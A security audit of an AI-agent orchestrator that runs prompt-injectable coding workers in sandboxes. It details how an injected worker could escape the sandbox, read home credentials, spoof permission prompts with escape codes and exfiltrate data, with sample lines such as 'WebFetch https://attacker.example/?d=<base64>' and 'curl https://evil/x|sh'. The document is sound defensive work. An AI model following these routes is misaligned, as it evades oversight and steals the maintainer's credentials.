# Security Audit — dipsaus-orchestrator (whole repository) — 2026-10-21

Status: historical review. The current status of every finding is in `milestone-review-2026-11-02.md` (section A.0, the earlier-findings table).

Read-only audit of `main` at `992a78f7`. No code was changed, nothing was run except `bun audit` and read-only `git log` / `grep` sweeps. Line numbers refer to that commit.

## 1. Summary

| Severity | Vulnerabilities |
|---|---|
| Critical | 0 |
| High | 2 |
| Medium | 3 |
| Low | 1 |

- Hardening gaps: 15.
- Dependencies: `bun audit` reports 1 high (node-forge 1.4.0 via `@anthropic-ai/sandbox-runtime`). The vulnerable code path is not reachable from dipo, and `audit.yml` ignores the advisory on purpose.
- Secrets: no real secret in the working tree or in the history of 622 commits. All hits are test fixtures or pattern definitions. gitleaks and semgrep are not installed, so a manual pattern sweep was used.

The main adversary in this product is the sandboxed worker: a model that reads untrusted repository, story and web content and can be prompt-injected. Both High findings let that worker get past the sandbox the engine builds around it. One is code execution as the maintainer. The other is reading credentials the worker's own sandbox hides from it.

**Fixes recommended first at the time**

1. **V-1:** add `backlog/`, `.dipo/` and `.claude/settings*.json` to the verify and install step `denyWrite` (`packages/engine/src/sandbox/policy.ts:187`). Re-run the backstop after verify and before `markInReview`. This closes code execution outside the sandbox through Backlog.md's `on_status_change`.
2. **V-2:** pass the read fence to post-turn verify (`packages/engine/src/run/verify-commit.ts:598`), the same way base verify already does (`worktree/setup.ts:344`).
3. **V-3:** stop calling file-tool writes outside the worktree "sandbox-bound", and refuse allow-once for them (`packages/engine/src/hooks/park-questions.ts:144,172`).

## 2. Scope & threat model

**Execution contexts**

- **Daemon (`dipo daemon`).** Runs unsandboxed as the maintainer, with their git, gh and SSH credentials. It runs git, gh and the Backlog.md CLI, and it owns the SQLite state DB, logs and backups.
- **Worker host and worker.** The worker is the Claude Code CLI on the host. Its Bash tool runs in Claude Code's srt sandbox, configured by `workers/claude-cli/plan.ts`. Its Read, Edit, Write and Web tools run outside that sandbox and are limited only by permission rules and dipo's PreToolUse and PermissionRequest hooks.
- **Engine steps.** Install, setup, verify and the credential check run worker-written code in dipo's own srt policy (`sandbox/policy.ts`, `dipo daemon sandbox-exec`). This is a different policy from the worker's, and both High findings sit in the gap between the two.
- **Clients.** The CLI, the TUI (Ink) and `dipo watch` connect to `dipo.sock` and render worker and repository text in the maintainer's terminal.
- **CI and release.** GitHub Actions, with the release App key in a protected environment. `install.sh` runs on users' machines.

**Assets.** The maintainer's credentials and home directory (SSH, gh, cloud CLIs, npm), code execution outside the sandbox, the integrity of the maintainer's repositories and remotes, the decisions that gate a merge (gates, reviewer verdicts, permission answers), the state DB (prompts and command bodies), and the integrity of released `dipo` binaries.

**Actors**

- A prompt-injected or misbehaving worker. This is the primary adversary.
- Authors of repository, story or web content that reaches a worker.
- Other local OS users.
- A compromised npm dependency.
- Fork PR authors.
- A network attacker against `install.sh`.

**Trust boundaries**

1. Worker to host filesystem and network: the srt sandbox plus permission rules.
2. Worker-written worktree to daemon processes that later read it unsandboxed: Backlog CLI, git, the hooks.
3. Worker text to the maintainer's terminal and to the decisions they make there.
4. Local processes to `dipo.sock`: only the 0700 runtime directory protects it.
5. PR content to CI.
6. Release artifacts to users.

<details>
<summary>Entry-point inventory</summary>

| Entry point | Location | Auth required? | Authorisation | Input validation | Touches |
|---|---|---|---|---|---|
| `dipo.sock` (WebSocket over a Unix socket) | `engine/src/platform/serve.ts:74-130`, `daemon/src/server.ts` | No. The `auth` frame is answered ok without checks (`server.ts:426-429`). No peer-credential check. Access relies on the 0700 runtime dir (`platform/paths.ts:201-221`). | Lifecycle gates only. `origin` and `confirmed` are claimed by the client (`contract/src/envelope.ts:24-35`). | `ClientFrame.safeParse`, per-command args parse, results re-checked, 4 MiB frames | Every command: `office.open` (any absolute path), work, gates, questions, `daemon.stop`, config |
| Worker host socket `<runtime>/hosts/<run>.sock` | `engine/src/host/main.ts`, `platform/line-socket.ts` | A token is needed only for `hookReply` (32 random bytes, compared in constant time, `host/main.ts:183-188`) | `write`, `signal`, `closeStdin` and `hook` need no token | `HelloFrame` and `OpFrame` parse, 4 MiB lines, 1 MiB hook payloads | Worker stdin and signals, pending permission answers |
| `launch.json` in `<git-common-dir>/dipo/runs/<run>/` | `runs/worker-hosts.ts:113-136`, `host/main.ts:130-143` | Filesystem only (0600, private dir; workers have denyWrite on `.git`) | Claimed by rename | `HostLaunchSchema.parse` | Host spawns `plan.argv` and `plan.env` unsandboxed |
| `dipo hook <event>` (run by Claude Code hooks, unsandboxed) | `daemon/src/hook.ts` | None (env `DIPO_HOST_SOCKET`, `DIPO_RUN`) | Gate fails closed; the Bash check fails open except for gh | Event-name regex; stdin limited to 1 MiB and 1 s | Relays to the host socket |
| `dipo daemon sandbox-exec --policy` | `daemon/src/sandbox-exec.ts`, `engine/src/platform/sandbox-exec.ts` | argv | Trust check on writable roots, PATH and binaries; exit 125 on refusal | `SandboxRuntimeConfigSchema.safeParse` | srt |
| `dipo restore <file>` | `daemon/src/restore.ts`, `engine/src/backup/restore.ts` | Local CLI; refuses while a daemon holds the lock | n/a | quick_check and migration version on a copy | Replaces `dipo.db` |
| Backlog.md CLI calls | `engine/src/backlog/runner.ts:147`, callers `run/story-git.ts:185`, `worktree/claim.ts:521`, `run/park.ts:174`, `backlog/lane/ops.ts:102` | n/a. Runs **unsandboxed**, cwd is the worktree, full daemon env (`daemon/src/runs.ts:85-87`) | Subcommand and flag allowlist | Flags only; config contents are not checked | Task files, `sh -c` callbacks (V-1) |
| Verify, setup and install steps | `run/verify-commit.ts:597-617`, `worktree/setup.ts`, `worktree/base-verify.ts` | Sandboxed (srt) | Step policy `sandbox/policy.ts` | n/a (runs worker code) | Worktree, temp root, install caches, home reads (V-2) |
| Worker WebFetch and WebSearch | `hooks/web-guard.ts`, `plan.ts:436` | PreToolUse gate | Denylist of copied env values | n/a | Arbitrary URLs (V-4) |
| PermissionRequest and park answers | `hooks/permissions.ts`, `hooks/questions.ts`, `hooks/park-questions.ts` | Maintainer answer | Default deny; allow-once matched on tool + `exactAction` | zod | File writes outside the worktree (V-3) |
| Safe-Chain proxy on `127.0.0.1:<ephemeral>` | `engine/src/platform/safe-chain-proxy.ts:311` | None | CONNECT only to registry hosts on port 443 | n/a | npm and PyPI egress |
| CI workflows | `.github/workflows/*.yml` | GitHub | `permissions: {}` at top level, least privilege per job | PR title goes through env only | No secrets on PR jobs |
| `install.sh` | repo root | n/a | n/a | `DIPO_VERSION` charset; HTTPS only; SHA256SUMS; `gh attestation verify` when gh is present | Installs a binary into the user's bin dir |

</details>

## 3. Vulnerabilities (confidence ≥ 7)

### V-1: Sandbox escape to code execution as the maintainer through Backlog.md `on_status_change`: `packages/engine/src/sandbox/policy.ts:187`

- **Severity:** High | **Confidence:** 9/10 | **Category:** sandbox-escape, command-execution
- **Locations:**
  - `packages/engine/src/sandbox/policy.ts:186-190`: step `denyWrite` covers only the two `.git` dirs.
  - `packages/engine/src/run/verify-commit.ts:394-405`: the backstop runs before verify. On green it goes to `#commit` at `:533` and then `markInReview` at `:691`.
  - `packages/engine/src/run/story-git.ts:185-192`: `backlog task edit … --status "In Review"`, with cwd set to the worktree.
  - `packages/engine/src/backlog/runner.ts:147`: plain spawn.
  - `packages/daemon/src/runs.ts:85-87`: no env override.
  - Same sink: `worktree/claim.ts:521`, `run/park.ts:174`.
- **Description:**
  - The worker session denies writes to `<worktree>/backlog`, `.dipo` and `.claude/settings*.json` (`workers/claude-cli/plan.ts:393-394, 529-534`).
  - The engine's verify step runs worker-written tests and `package.json` scripts under a different policy, which leaves those paths writable.
  - Nothing compares `backlog/` again after verify.
  - On a green turn the daemon runs the Backlog.md CLI unsandboxed, as the maintainer, in that worktree, with the daemon's full environment.
  - Backlog.md 1.53.0 reads `on_status_change` from the project's `backlog/config.yml`, or `onStatusChange` from task frontmatter. When a status changes it runs that value with `spawn(["sh","-c",cmd], {env: {...process.env, …}})`. This was confirmed from the installed binary.
  - dipo never checks for these keys. A grep across `packages/` finds no `onStatusChange` or `on_status_change`.
- **Exploit scenario (prompt-injected worker):**
  1. The worker writes an in-scope test that, when run, appends `on_status_change: '<cmd>'` to `backlog/config.yml`. Adding the field to the task file's frontmatter works the same way. The worker cannot write that file directly, but its test can.
  2. Verify runs the test in the step sandbox and the file is changed on disk.
  3. Verify is green, so `markInReview` runs `backlog task edit <id> --status "In Review"`.
  4. Backlog.md runs `<cmd>` through `sh -c`, outside every sandbox, with the maintainer's git, gh and SSH access. The file does not have to be committed.
- **Recommendation:**
  - Give engine steps the same protected-path list as the worker. Put `<worktree>/backlog`, `<worktree>/.dipo`, `<worktree>/.claude/settings.json`, `<worktree>/.claude/settings.local.json` and `.mcp.json` in `denyWrite` for the verify, setup and install kinds. Keep one shared list so the two policies cannot drift apart again.
  - After a green verify, take the backstop again (backlog and `.dipo` status against the run-start snapshot) and re-run the scope check before `#commit`. Park `scope-violation` on any difference.
  - Defence in depth: refuse to run a status-changing `backlog task edit` when the worktree's `backlog/config.yml` or the task frontmatter has `onStatusChange` or `on_status_change`. Also run the Backlog CLI with a minimal env, and preferably in the step sandbox. See also N-1.
- **Patch sketch:**

  ```ts
  const denyWrite = literal("denyWrite", [
    joinPath(run.mainCheckout, ".git"),
    ...PROTECTED_WORKTREE_PATHS.map((p) => joinPath(run.worktree, p)), // .git, backlog, .dipo, .claude/settings*.json
  ]);
  ```

### V-2: Post-turn verify reads home secrets the worker cannot, then feeds them back and pushes them: `packages/engine/src/run/verify-commit.ts:598`

- **Severity:** High | **Confidence:** 8/10 | **Category:** credential-disclosure, sandbox-policy-gap
- **Locations:**
  - `packages/engine/src/run/verify-commit.ts:598-612`: `runStep({kind:"verify"})` without `readFence`.
  - `packages/engine/src/worktree/setup.ts:344`: the only caller that passes a fence.
  - `packages/engine/src/sandbox/policy.ts:200-207`: reads are a denylist.
  - Feedback: `verify-commit.ts:650-656`, `:470-499` and `prompts/feedback.ts:160-199`. ANSI is stripped and output is cut to about 3,000 characters, with no redaction.
  - Push: `verify-commit.ts:706-708`.
  - `config/schema.ts:669`: `worker.web: true` by default.
- **Description:**
  - The worker's Bash sandbox blocks reads outside the working directories (`plan.ts:439`).
  - Post-turn verify runs the same worker-written code without the DIPO-183 read fence, so everything in home outside a short denylist is readable. Examples: `~/.config/gcloud`, `~/.azure`, `~/.pypirc`, `~/.cargo/credentials*`, `~/.claude.json`, shell history, browser profiles under `~/Library/Application Support`, and other repositories' `.env` files.
  - Failing verify output goes back to the worker as its next message.
- **Exploit scenario (prompt-injected worker):**
  1. Turn N writes a test that prints `~/.config/gcloud/application_default_credentials.json` and fails.
  2. The red verify returns the contents as feedback.
  3. Turn N+1 sends them out with `WebFetch https://attacker.example/?d=<base64>`. WebFetch is on by default and runs outside the sandbox.

  A second channel needs no model read at all. A green test overwrites an in-scope placeholder file with the secret, and dipo commits it and pushes the branch to `origin`.
- **Recommendation:**
  - Pass `readFence: { readPaths: [...config.sandbox.toolchainReadPaths, ...config.sandbox.allowRead] }` in the post-turn verify `runStep`, the same as `setup.ts:344`.
  - Do the same for install steps where the cache paths allow it.
  - Defence in depth: redact known secret shapes in verify feedback, and scan the diff for secrets before push (see H-6).

### V-3: Allow-once is described as sandbox-bound but lets the worker write any content outside the worktree: `packages/engine/src/hooks/park-questions.ts:144`

- **Severity:** Medium | **Confidence:** 8/10 | **Category:** authorization, misleading-consent
- **Locations:**
  - `packages/engine/src/hooks/park-questions.ts:144`: "where the worker's sandbox lets it write nothing".
  - `park-questions.ts:172-174`: "Allow once only passes the permission check and cannot lift a sandbox block".
  - `park-questions.ts:187-191`.
  - `packages/engine/src/workers/claude-cli/hooks.ts:261-268`: `exactAction` returns only `file_path`.
  - `hooks.ts:242-249`: the summary shows the path, not the content.
  - `hooks/questions.ts:185-207` and `hooks/permissions.ts:318-326`: the match.
  - `plan.ts:404-440`: no deny outside the worktree beyond the main checkout.
  - ADR 0008 line 146.
- **Description:**
  - The `claude` process is not inside srt. Its Write, Edit, MultiEdit and NotebookEdit tools are limited only by permission rules, and ADR 0008 says so itself.
  - For a write outside the worktree, the park question tells the maintainer that allow-once cannot lift a sandbox block. That statement is false.
  - Allow-once matches on tool plus path only. The resumed session can then write arbitrary, never-shown bytes to that path, for example `~/Library/LaunchAgents/x.plist` or `~/.zshrc`.
  - The worker's `needsPermission` claim comes from the worker itself (`result.ts:116-123`).
- **Exploit scenario (prompt-injected worker):**
  1. The worker asks to Write `~/Library/LaunchAgents/com.example.plist`.
  2. The maintainer reads "Sandbox-bound … cannot lift a sandbox block" and allows once, believing it harmless.
  3. The worker writes a LaunchAgent that runs a command at the next login, outside every sandbox.
- **Recommendation:**
  - For file tools whose realpath is outside the worktree and run temp roots, refuse allow-once (deny only), and skip such calls in `#allowOnce`.
  - Fix the wording in `writeOutside` and `parkQuestionText`.
  - Add a PreToolUse check for the file tools that denies a realpath outside the worktree.
  - Update the test at `park-answers.test.ts:552-575`, which asserts the current wording.

### V-4: The worker can empty the WebFetch secret gate, and WebFetch reaches any domain by default: `packages/engine/src/hooks/web-guard.ts:257`

- **Severity:** Medium | **Confidence:** 8/10 | **Category:** data-exfiltration
- **Locations:**
  - `packages/engine/src/hooks/web-guard.ts:227-268, 402-411`: the comparison set is re-read from the worktree copy on every call.
  - `:257-258`: a missing file is skipped with `continue`.
  - `plan.ts:405`: the only read block is a Read-tool rule. Sandboxed `cat .env` is not blocked.
  - `plan.ts:436`: bare WebFetch and WebSearch allow.
  - `config/schema.ts:669`: `web: true`.
- **Description:**
  - The gate refuses WebFetch and WebSearch calls that contain values from the env files dipo copied into the worktree. It reads those values from the worktree copy, which the worker can read, rewrite or delete from Bash.
  - A deleted or emptied file gives an empty set, and the call goes out.
  - Output redaction (`redactOutput`) uses the same reader, so the value is not redacted in stored output either.
- **Exploit scenario:** `cat .env` → `: > .env` → `WebFetch https://attacker.example/?k=<value>`.
- **Recommendation:**
  - Build the secret set once at setup, when `worktree/files.ts` copies the entries, and keep it engine-side. Alternatively, read it from `<main>/<entry.path>`.
  - Treat a copied entry that is missing or unreadable as a deny.
  - Separately, consider a WebFetch domain allowlist, or `web: false` by default (H-5).

### V-5: `dipo watch` prints escape codes from worker text, so a dangerous permission request can be shown as a harmless one: `packages/cli/src/watch-command.ts:254`

- **Severity:** Medium | **Confidence:** 8/10 | **Category:** terminal-injection, ui-spoofing
- **Locations:**
  - `packages/cli/src/watch-command.ts:254, 320`: `question.text` printed raw.
  - `:198, 479-487`: worker output lines printed raw.
  - `packages/cli/src/index.ts:252`: `process.stdout.write`.
  - Source: `packages/engine/src/workers/claude-cli/hooks.ts:228-249` (`oneLine` collapses only `\s+`, so ESC survives) and `hooks/questions.ts:85`.
- **Description:**
  - The TUI strips control characters from question text (`tui/src/detail.tsx:172`). `dipo watch` does not.
  - Cursor-movement and erase sequences work in every terminal, so the question line can show a command other than the one that will be allowed.
  - Allow-once then matches the real command.
- **Exploit scenario (prompt-injected worker):**
  1. The worker requests Bash `curl https://evil/x|sh #ESC[14DESC[Kbun test`.
  2. `dipo watch` shows `asks permission qst_x: Bash(bun test) …`.
  3. The maintainer runs `dipo answer qst_x allow`, which approves the hidden command.

  The command still runs in the Bash sandbox, which limits the damage. Worker output lines can also erase earlier lines or fake a `question closed` line.
- **Recommendation:**
  - Add one `stripTerminalControls(text)` (7-bit and C1 CSI, OSC, DCS, SOS, PM and APC; C0 except `\n` and `\t`; DEL; U+0080–U+009F) in a shared package.
  - Use it for every interpolated string in `watch-command.ts` and `run-command.ts`, in TUI `cleanLine` and `promptLines`, and engine-side in `oneLine`/`inputSummary`.

### V-6: The per-run temp dir in shared `/tmp` follows a planted symlink, which moves the worker's write grant: `packages/engine/src/run/temp-dirs.ts:116`

- **Severity:** Low (needs a second local OS user) | **Confidence:** 7/10 | **Category:** symlink-following, toctou
- **Locations:**
  - `packages/engine/src/run/temp-dirs.ts:116-122`: `prepareRunTempDir`.
  - `packages/engine/src/platform/paths.ts:293-297`: recursive mkdir plus chmod. No lstat, owner or realpath check.
  - The sibling `prepareShortTempDir` at `temp-dirs.ts:130-155` has all three checks.
  - `daemon/src/foreground.ts:505`: tmpRoot defaults to `/tmp`.
  - `workers/claude-cli/plan.ts:506-512, 630-665`: the path becomes `allowWrite` and `TMPDIR`, with only a spelling check.
- **Description:**
  - `/tmp/dipo-run-<runId>` is visible to every user. When a run parks, the directory is removed and the same run id is reused on resume.
  - Another local user can plant a symlink with that name pointing at a directory the maintainer owns.
  - On resume the daemon follows it: it chmods the target to 0700, writes `.dipo-owner` into it, and grants the worker write access there.
- **Exploit scenario:**
  1. Another local user plants `/tmp/dipo-run-<id>` → `~/Library/LaunchAgents` while the run is parked.
  2. A prompt-injected worker on resume writes a plist there.
- **Recommendation:**
  - Give `prepareRunTempDir` the same non-recursive mkdir, lstat, not-a-link and uid checks as `prepareShortTempDir`.
  - In `plan()`, require `realpath(tmp) === tmp`.
  - Consider defaulting tmpRoot to a per-user 0700 directory.

## 4. Needs investigation (confidence 5–6, plus one below 5 with high impact)

- **N-1** `packages/engine/src/backlog/runner.ts:147`, `daemon/src/runs.ts:85-87` (4–5): the Backlog CLI is a Bun-compiled binary started unsandboxed with cwd set to a worker-writable worktree. It could load Bun configuration from that worker-writable folder, which would give the worker code execution without V-1. dipo already guards its own binary against this (smoke test). Running the CLI with cwd outside the worktree and a minimal env removes the question.
- **N-2** `workers/claude-cli/plan.ts:544-547` with `DIPO_HOST_SOCKET` (`plan.ts:347`) (3–4, listed for impact): on macOS a worker might symlink `<runtime>/dipo.sock` into its allowed short temp root and connect. Whether Seatbelt matches the resolved path decides it. If it connects, the worker has the whole unauthenticated control plane (H-3). **Confirm:** one live srt test with a symlinked socket.
- **N-3** `sandbox/policy.ts:184-186`, `config/schema.ts:768` (6): install steps can write the maintainer's global `~/.bun/install/cache`. ADR 0008 (amendment of 2026-10-12) accepts this. New detail: a kept branch that is re-claimed (`worktree/claim.ts:262-267`, `keepBranch: true` after drop, orphan or start failure) runs the earlier worker's `postinstall` with that cache write. **Confirm:** whether to revisit the accepted risk with a per-office cache (`BUN_INSTALL_CACHE_DIR`, `npm_config_cache`).
- **N-4** `.github/workflows/release.yml:175-177` (5): setup-bun's executable cache is on in the release build, and Bun is downloaded without a checksum. A compromised dev dependency on `main` could poison the cache that the release build restores. **Confirm:** set `no-cache: true` and check.
- **N-5** `renovate.json:17-22` (6): `lockFileMaintenance` automerge re-resolves transitive runtime dependencies that are compiled into `dipo`, without human review. The `dependencies` no-automerge rule does not cover it. **Confirm:** whether that is intended.
- **N-6** `review/verdict.ts:69`, `story-pr/body.ts:78` (5): the reviewer verdict that leads to merge has only code-side demotion. A worker that plants text aimed at the reviewer has no deterministic stop before approval. Required CI and `maintainer` criteria mitigate this. **Confirm:** that merge after review always needs required checks and that no story merges on the verdict alone.
- **N-7** `tui/src/detail.tsx:108-117`, `tui/src/output.ts:47-55`, `cli/src/run-command.ts:140-143,199-201` (5–6): the TUI prompt pane and `dipo run --dry` print repository text with SGR (conceal), OSC 8 links and C1 OSC intact. `cleanLine` misses C1. Ink drops 7-bit OSC 52 and title codes, but not C1 ones. **Confirm:** whether the maintainer's terminal acts on UTF-8 C1. The fix is the same as V-5.

## 5. Hardening gaps

| # | Gap | Risk it mitigates | Where it is absent | Effort |
|---|---|---|---|---|
| H-1 | No sandbox, minimal env or neutral cwd for the Backlog.md CLI | Any Backlog.md feature that reads worktree files becomes host code execution (V-1, N-1) | `engine/src/backlog/runner.ts`, `daemon/src/runs.ts:85-87` | M |
| H-2 | Two protected-path lists (worker vs engine steps) with no shared source | Policy drift; V-1 is that drift | `sandbox/policy.ts:187`, `workers/claude-cli/plan.ts:393-401,526-537` | S |
| H-3 | No authentication on `dipo.sock` (`auth` is a no-op, `origin` and `confirmed` are claimed by the client). Host steering ops (`write`, `signal`, `hook`) need no token. | Any same-uid process, or a sandbox escape, gets full control (answer gates, start runs, change config) | `daemon/src/server.ts:426-429`, `contract/src/envelope.ts:24-35`, `engine/src/host/main.ts` (op dispatch) | M |
| H-4 | Worker run settings have no explicit denyRead for dipo state, log and runtime dirs (engine steps have it) | `dipo.db` (engine tokens, prompts) is protected only by Claude Code's `blockReadsOutsideWorkingDirectories` | `workers/claude-cli/plan.ts:518-527` vs `sandbox/policy.ts:200-206` | S |
| H-5 | WebFetch and WebSearch on by default with no domain allowlist | Exfiltration of anything the worker can read (V-2, V-4) | `config/schema.ts:669`, `plan.ts:436` | M |
| H-6 | No secret-content scan before prompts, stored output, commit or push. The secret-name list misses `.credentials.json`, `.pypirc`, `.yarnrc.yml`, `*.tfvars`, `*.tfstate`, `.dev.vars`, `.vault-token`, `client_secret*.json`, `application_default_credentials.json`, `kubeconfig`, `*.p8`, `*.ppk`. The review diff has no secret-path filter. | Hard-coded or copied secrets reach the model, the DB and the remote | `context/secrets.ts:7-31`, `run/review-launch.ts:104-150`, `run/story-git.ts:151` | M |
| H-7 | No shared terminal-control stripping | V-5, N-7 | `cli/src/watch-command.ts`, `cli/src/run-command.ts`, `tui/src/output.ts:49`, `tui/src/detail.tsx:108`, `client/src/node/logs/reader.ts:91-110` | S |
| H-8 | `storeCommandBodies: true` by default (the header of `ingest/output.ts:1-21` still says opt-in), with no value-level scrubbing. Log `msg` and error strings are not scrubbed (git stderr may hold credentialed URLs). | Tokens in commands persist in the DB, change log and backups for 7 days | `config/schema.ts:778`, `ingest/output.ts:77-83`, `log/logger.ts` | S |
| H-9 | Post-turn backstop and scope check run only before verify | Any write made during verify is live for that turn's unsandboxed calls | `run/verify-commit.ts:394-433` | S |
| H-10 | tmpRoot defaults to shared `/tmp`; the run temp dir and step files (`/tmp/dipo-s-*.refused`) sit there | Squatting and symlink games by other local users (V-6) | `daemon/src/foreground.ts:505`, `platform/sandbox.ts:318-368` | S |
| H-11 | No CODEOWNERS or required human review for `.github/**`, `install.sh` and `release-please*`. The required `pr-title` check runs the PR's own `scripts/check-pr-title.ts`. | A malicious or buggy workflow or release change merges after agent review only (0016:234) | repo root, `.github/workflows/pr-title.yml:29` | S |
| H-12 | No workflow linter (zizmor or actionlint) in CI | Regressions in permissions, pinning or injection | `.github/workflows/ci.yml` | S |
| H-13 | `install.sh` skips attestation when `gh` is absent and does not pin `--source-digest` or the tag. SHA256SUMS comes from the same origin as the binary. | A tampered release asset passes on machines without gh | `install.sh:117-140` | M |
| H-14 | Root `.gitignore` has no `.env*`, `*.pem`, `*.key`, `.npmrc` (docs/release.md:24 has the maintainer download the App `.pem`) | Accidental commit of the release App private key; push protection is the only safety net | `.gitignore` | S |
| H-15 | The bash checks expand nothing (variables, globs, substitution as the program name), fail open on the 5 s hook timeout, and have no length cap. Partly tracked in DIPO-261 and DIPO-262. | gh-check bypass. Harmless today only because the sandbox has no GitHub network and no token. Adding a GitHub host to `sandbox.allowedDomains` would make it matter, and nothing refuses that in code. | `hooks/gh-guard.ts:203-258`, `workers/claude-cli/hooks.ts:7-8,145-156`, `sandbox/policy.ts` | M |

## 6. Dependencies & secrets

**Dependencies**

- `bun audit` (Bun 1.4.2) was run. Result: 1 high, 0 other.
  - node-forge 1.4.0, GHSA-86w9-cpqp-85rv (RSA PKCS#1 v1.5 signature verification accepts extra nested DigestAlgorithm elements), via `engine > @anthropic-ai/sandbox-runtime@0.0.79`.
  - **Not reachable.** sandbox-runtime uses forge only for MITM CA and leaf-certificate creation (`mitm-ca.js`, `mitm-leaf.js`). There are no `.verify(` or `verifyCertificateChain` calls. That code runs only when `network.tlsTerminate` is set, and dipo never sets it (`sandbox/policy.ts`, `platform/sandbox-exec.ts`). Forge is still bundled into the binary.
  - `audit.yml:31-38` ignores this advisory on purpose (`--ignore=GHSA-86w9-cpqp-85rv`). The ignore has no expiry and no tracking issue. Clear it when sandbox-runtime moves to node-forge ≥ 1.4.1.
- `dependency-review` only flags newly introduced vulnerabilities, so it does not see this one.
- No `trustedDependencies` and no dependency install scripts. CI and release use `bun install --frozen-lockfile`.
- semgrep: **not run** (not installed).

**Secrets**

- gitleaks: **not run** (not installed). It was replaced by a manual `git log -p --all` sweep over 622 commits (417,583 lines) for `ghp_`, `gho_`, `ghs_`, `ghu_`, `github_pat_`, `sk-ant-`, `AKIA…`, `BEGIN … PRIVATE KEY`, `xox?-`, `npm_…`, `_authToken=`, `password[:=]`, JWT, `AIza`, and `Bearer`.

| Kind | Where | Prefix | History / tree | Verdict |
|---|---|---|---|---|
| gh token shape | commit `7846926d`, `packages/engine/test/ingest/command-bodies.test.ts` | `ghp_` | both | fixture |
| Anthropic key shape | commits `d8fa6dd4`, `4e2895ce` (`test/workers/…`), `b8191239` (`tools/recordings/scrub.test.ts`) | `sk-a` | both | fixture ("not a real key", "planted") |
| npm token shape | commit `99b77f1e` (launch-checks and npm-token-check tests) | `npm_` | both | fixture |
| `_authToken=` / `_password=` | commits `99b77f1e`, `09313fa0`, `f6376ad3` | `${SE` | both | template placeholders |
| PRIVATE KEY header | commits `5a8f6b7f`, `09313fa0` | `----` | both | stub header in tests |

No real secret was found, so no rotation is needed. `git ls-files` shows no `.env`, `*.pem`, `*.key`, `.npmrc` or `office.local.yaml`. `.dipo/office.local.yaml` (ignored) holds config keys only.

## 7. What is done well

- **Git hardening is thorough** (`engine/src/git/hardened.ts`).
  - Every engine git call goes through it: `core.hooksPath=/dev/null`, `core.fsmonitor=false`, `GIT_CONFIG_NOSYSTEM`, the `GIT_*` env dropped, `GIT_DIR` and `GIT_COMMON_DIR` forced from recorded paths, `protocol.ext.allow=never` on fetch, LFS smudge off on `_base`, `--no-verify` on commit and push.
  - Worktree tamper detection: `git/snapshot.ts` and `OfficeGit.#assertUntampered`.
  - No `shell:true`, no `Bun.$` and no data-built `sh -c` anywhere on the git path.
- **The worker sandbox defaults are strict** (`workers/claude-cli/plan.ts:489-554`).
  - Network closed, `allowUnsandboxedCommands: false`, `failIfUnavailable`.
  - Env is an allowlist; token, loader and `GIT_*` variables are refused as tool variables.
  - Keychains, `~/.ssh` and `~/.config/gh` are denied.
  - Before launch, the engine checks that `gh auth token` and the Keychain lookup fail inside srt (`workers/credential-check.ts`).
- **The project-settings allowlist** is checked before every launch and resume (`workers/claude-cli/settings-check.ts`). It refuses unknown keys and can never allow `sandbox`. Unlisted plugins are off, `--strict-mcp-config` is set, and agent and skill tools are refused.
- **The context reader is careful** (`context/workspace.ts:42-96`). It refuses `..`, symlinks (lstat, O_NOFOLLOW, realpath check), hard links and non-regular files, and re-checks dev and inode on the open descriptor. A repo symlink to `~/.ssh/id_rsa` is refused.
- **Model output is parsed strictly.** Reports use zod `strictObject`. The verdict is computed in code, and blocking findings need a quoted diff line. Phase markers are recognised by flag, not text, so a worker cannot fake them (`run/markers.ts`, `review/validate.ts`).
- **Prompt tag neutralising** happens centrally in `prompts/templates.ts:127-185`.
- **Data at rest uses private modes.** State dir 0700, `dipo.db` 0600 (WAL and SHM files re-chmodded), backups 0700/0600, logs 0700/0600, run dir 0700. Retention is enforced in batches.
- **The runtime dir choice is careful** (`platform/paths.ts:99-255`). It uses lstat, checks owner and mode 0700, and falls back to mkdtemp when the dir is squatted. `prepareShortTempDir` has the right checks, and V-6 is about its sibling.
- **IPC validation** is zod at every boundary, with size limits on frames, lines and hook payloads. The host token is 32 random bytes compared in constant time. The gate hook fails closed.
- **SQL** uses only bound parameters. All dynamic fragments come from code constants.
- **Deletes are symlink-safe** (`retention/run-files.ts`, `run/temp-dirs.ts` remove path, `worktree/sweep.ts`, `worktree/teardown.ts`). Backup restore does no archive extraction.
- **YAML and config merging:** one-document `Bun.YAML.parse` and an own-property merge, both validated with a strict schema, so a `__proto__` key does not pollute the prototype (`config/merge.ts`).
- **CI**
  - `permissions: {}` at top level and least privilege per job.
  - All actions pinned to full SHAs (Renovate `pinGitHubActionDigests`) and `persist-credentials: false` everywhere.
  - No `pull_request_target`, and PR data reaches the shell only through env.
  - The release App key sits in a main-only environment, `release` needs human approval, and releases ship SHA256SUMS plus build provenance.
- **`install.sh`** downloads with `--proto '=https' --tlsv1.2` and checks SHA256 against SHA256SUMS. It validates the version charset and extracts a regular file only, with an atomic rename. It runs everything inside `main()`, so a truncated `curl | sh` does nothing.
- **Recordings** are scrubbed by an allowlist, and a secret guard runs at capture time and as a unit test.

## 8. Fix plan

None of these needs a secret rotation. Stored command bodies may hold tokens for up to 7 days (H-8). That is optional cleanup, not required.

1. **Step sandbox parity (V-1, V-2, H-2, H-9).** One change set in `sandbox/policy.ts` and `run/verify-commit.ts`:
   - Add a shared protected-path list to step `denyWrite`.
   - Pass `readFence` to post-turn verify, and to install where possible.
   - Re-run the backstop and scope check after verify, before `#commit`.
2. **Backlog CLI isolation (V-1 depth, N-1, H-1).** In `backlog/runner.ts` and `daemon/src/runs.ts`:
   - Pass an explicit minimal env.
   - Use a cwd outside the worktree, or the `_backlog` worktree, or run it under the step sandbox.
   - Refuse `onStatusChange` and `on_status_change` in config and task frontmatter before status edits.
3. **File-tool permission answers (V-3).**
   - `hooks/park-questions.ts`: fix the wording.
   - `hooks/permissions.ts` and `hooks/questions.ts`: no allow-once for file tools outside the worktree.
   - Add a PreToolUse realpath check.
   - Update `park-answers.test.ts`.
4. **Web exfiltration (V-4, H-5).** In `hooks/web-guard.ts`:
   - Build the secret set at setup and keep it engine-side.
   - Treat a missing copy as a deny.
   - Decide on a domain allowlist or `web: false` by default. That changes ADR 0020 §11b, so it needed the maintainer's approval.
5. **Terminal output (V-5, N-7, H-7).** Add one shared `stripTerminalControls` and apply it in `cli/src/watch-command.ts`, `cli/src/run-command.ts`, `tui/src/output.ts`, `tui/src/detail.tsx`, and engine `hooks.ts` `oneLine`.
